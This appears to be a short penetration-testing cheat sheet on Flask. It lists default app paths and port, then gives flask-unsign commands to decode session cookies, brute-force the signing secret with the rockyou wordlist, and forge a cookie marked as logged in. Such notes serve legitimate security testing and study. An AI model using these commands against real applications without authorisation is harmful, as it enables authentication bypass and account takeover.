# Default web Config
/app/app/myapp/app.py
/app/myapp/app.py
# Default Port
5000


# Flask-unsign
> Tool to decrypt flask cookie using secret key which can be found in flask app.py 

## install flask-unsign
`pipx install flask-unsign`

## Usage
#### Decode Cookie
`flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'`

#### Brute Force
`flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval`

#### Signing
`flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'`

#### Signing using legacy (old versions)
`flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy`



---
Tags: #Flask
Resources: 
[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)